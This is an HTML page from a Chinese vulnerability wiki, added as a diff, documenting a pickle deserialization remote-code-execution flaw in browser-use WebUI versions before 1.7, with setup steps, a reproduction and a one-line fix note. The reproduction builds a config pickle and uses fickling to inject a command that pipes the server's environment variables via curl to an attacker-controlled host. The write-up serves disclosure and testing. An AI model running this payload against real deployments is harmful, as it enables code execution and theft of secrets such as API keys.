@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E6%BC%8F%E6%B4%9E/browser-use%20WebUI%20pickle%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>browser-use WebUI pickle 反序列化漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "browser-use WebUI pickle \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u62ab\u9732\u65f6\u95f4", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_3" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_4" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_5" },
+              {title: "\u6f0f\u6d1e\u4fee\u590d", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        DNS域传送漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Ollama%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-37032/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Ollama%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-37032/" class="btn btn-xs btn-link">
+        Ollama 目录遍历致代码执行漏洞 CVE-2024-37032
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="browser-use-webui-pickle">browser-use WebUI pickle 反序列化漏洞<a class="headerlink" href="#browser-use-webui-pickle" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>browser-use WebUI 是基于 browser-use 的 AI Agent 应用。2025 年 4 月，互联网上披露其旧版接口 update_ui_from_config 存在一个 pickle 反序列化漏洞，未经授权的远程攻击者可以利用该接口发送恶意的序列化数据，实现在服务端执行任意代码，导致服务器失陷。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://github.com/browser-use/web-ui/commit/7fdf95edaeaf2505b36c10966b7b8d65359f1de6">https://github.com/browser-use/web-ui/commit/7fdf95edaeaf2505b36c10966b7b8d65359f1de6</a></li>
+<li><a href="https://research.kudelskisecurity.com/2025/04/23/getting-rce-on-browser-use-web-ui-ai-agent-instances/">https://research.kudelskisecurity.com/2025/04/23/getting-rce-on-browser-use-web-ui-ai-agent-instances/</a></li>
+<li><a href="https://github.com/browser-use/web-ui/tree/v1.6">https://github.com/browser-use/web-ui/tree/v1.6</a></li>
+</ul>
+<h2 id="_2">披露时间<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>2025-04-28</p>
+<h2 id="_3">漏洞影响<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>browser-use WebUI &lt; 1.7
+</code></pre></div>
+<h2 id="_4">环境搭建<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>根据 <a href="https://github.com/browser-use/web-ui/tree/v1.6">官方文档</a>，执行以下命令搭建并启动一个 1.6 版本的 browser-use WebUI：</p>
+<div class="highlight"><pre><span></span><code># 检出 1.6 版本
+git clone https://github.com/browser-use/web-ui.git
+cd web-ui/
+git checkout v1.6
+
+# 创建 python 3.11 虚拟环境（官方文档为 uv，此处为 anaconda）
+conda create -n web-ui python=3.11
+conda activate web-ui
+
+# 安装依赖
+pip install -r requirements.txt
+playwright install
+
+# 配置环境
+copy .env.example .env
+
+# 启动服务
+python webui.py --ip 127.0.0.1 --port 7788
+</code></pre></div>
+<p>注意，除了官方 <code>requirements.txt</code> 中的 python 依赖外，需要另外安装 <code>socksio</code> 和 <code>pysocks</code>，回退 <code>gradio</code> 至旧版本，否则将引发错误：</p>
+<div class="highlight"><pre><span></span><code>pip install socksio pysocks
+pip install gradio==5.23.0
+</code></pre></div>
+<p>环境启动后，访问 <code>http://your-ip:7788/</code>，此时 WebUI 1.6 已经成功运行。</p>
+<p><img alt="" src="../images/browser-use%20WebUI%20pickle%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20250507140601827.png" /></p>
+<h2 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<p>漏洞位于 <code>src/utils/default_config_settings.py</code>，服务器未对用户上传的 <code>.pkl</code> 配置文件进行校验，攻击者可以加载包含任意代码的恶意 pickle 文件：</p>
+<p><img alt="" src="../images/browser-use%20WebUI%20pickle%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20250507141416084.png" /></p>
+<p>首先，我们创建一个名为 <code>default.pkl</code> 的常规 pickle 配置文件，其中包含默认的 WebUI 配置：</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">uuid</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">default_config</span><span class="p">():</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;Prepare the default configuration&quot;&quot;&quot;</span>
+    <span class="k">return</span> <span class="p">{</span>
+        <span class="s2">&quot;agent_type&quot;</span><span class="p">:</span> <span class="s2">&quot;custom&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;max_steps&quot;</span><span class="p">:</span> <span class="mi">100</span><span class="p">,</span>
+        <span class="s2">&quot;max_actions_per_step&quot;</span><span class="p">:</span> <span class="mi">10</span><span class="p">,</span>
+        <span class="s2">&quot;use_vision&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
+        <span class="s2">&quot;tool_calling_method&quot;</span><span class="p">:</span> <span class="s2">&quot;auto&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;llm_provider&quot;</span><span class="p">:</span> <span class="s2">&quot;openai&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;llm_model_name&quot;</span><span class="p">:</span> <span class="s2">&quot;gpt-4o&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;llm_temperature&quot;</span><span class="p">:</span> <span class="mf">1.0</span><span class="p">,</span>
+        <span class="s2">&quot;llm_base_url&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;llm_api_key&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;use_own_browser&quot;</span><span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;CHROME_PERSISTENT_SESSION&quot;</span><span class="p">,</span> <span class="s2">&quot;false&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&quot;true&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;keep_browser_open&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span>
+        <span class="s2">&quot;headless&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span>
+        <span class="s2">&quot;disable_security&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
+        <span class="s2">&quot;enable_recording&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
+        <span class="s2">&quot;window_w&quot;</span><span class="p">:</span> <span class="mi">1280</span><span class="p">,</span>
+        <span class="s2">&quot;window_h&quot;</span><span class="p">:</span> <span class="mi">1100</span><span class="p">,</span>
+        <span class="s2">&quot;save_recording_path&quot;</span><span class="p">:</span> <span class="s2">&quot;./tmp/record_videos&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;save_trace_path&quot;</span><span class="p">:</span> <span class="s2">&quot;./tmp/traces&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;save_agent_history_path&quot;</span><span class="p">:</span> <span class="s2">&quot;./tmp/agent_history&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;task&quot;</span><span class="p">:</span> <span class="s2">&quot;go to google.com and type &#39;OpenAI&#39; click search and give me the first url&quot;</span><span class="p">,</span>
+    <span class="p">}</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">load_config_from_file</span><span class="p">(</span><span class="n">config_file</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;Load settings from a UUID.pkl file.&quot;&quot;&quot;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">config_file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">settings</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">settings</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;Error loading configuration: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">save_config_to_file</span><span class="p">(</span><span class="n">settings</span><span class="p">,</span> <span class="n">save_dir</span><span class="o">=</span><span class="s2">&quot;./tmp/webui_settings&quot;</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;Save the current settings to a UUID.pkl file with a UUID name.&quot;&quot;&quot;</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">save_dir</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">outname</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="si">}</span><span class="s2">.pkl&quot;</span>
+    <span class="k">if</span> <span class="n">name</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="n">outname</span> <span class="o">=</span> <span class="n">name</span>
+    <span class="n">config_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">save_dir</span><span class="p">,</span> <span class="n">outname</span><span class="p">)</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">config_file</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">pickle</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">settings</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
+    <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;Configuration saved to </span><span class="si">{</span><span class="n">config_file</span><span class="si">}</span><span class="s2">&quot;</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">update_ui_from_config</span><span class="p">(</span><span class="n">loaded_config</span><span class="p">):</span>
+    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">loaded_config</span><span class="p">,</span> <span class="nb">dict</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;load success&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">loaded_config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;agent_type&quot;</span><span class="p">,</span> <span class="s2">&quot;custom&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">pass</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;not a dict object&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s2">&quot;foobar&quot;</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">save_config_to_file</span><span class="p">(</span><span class="n">default_config</span><span class="p">(),</span> <span class="n">save_dir</span><span class="o">=</span><span class="s2">&quot;.&quot;</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;default.pkl&quot;</span><span class="p">)</span>
+</code></pre></div>
+<p>接下来，我们安装 <a href="https://github.com/trailofbits/fickling">fickling</a> 并使用它将恶意代码注入 pickle 文件。以下命令将生成一个名为 <code>malicious.pkl</code> 的恶意文件，该文件在加载时，将运行 <code>env | curl -XPOST http://your-ip:9999 --data-binary @-</code> ，泄露目标服务器的环境变量到攻击者服务器：</p>
+<div class="highlight"><pre><span></span><code># 安装依赖
+python -m pip install fickling
+
+# 注入恶意代码
+fickling --inject &quot;os.system(&#39;env | curl -XPOST http://your-ip:9999 --data-binary @-&#39;)&quot; default.pkl &gt; malicious.pkl
+</code></pre></div>
+<p>最后，我们通过 WebUI 的 Configuration 选项卡加载此文件：</p>
+<p><img alt="" src="../images/browser-use%20WebUI%20pickle%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20250507142719674.png" /></p>
+<p>监听 <code>9999</code> 端口，即可接收到 <code>env</code> 的执行结果：</p>
+<p><img alt="" src="../images/browser-use%20WebUI%20pickle%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20250507143023954.png" /></p>
+<h2 id="_6">漏洞修复<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<p>升级至最新版本。</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        DNS域传送漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Ollama%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-37032/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Ollama%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-37032/" class="btn btn-xs btn-link">
+        Ollama 目录遍历致代码执行漏洞 CVE-2024-37032
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
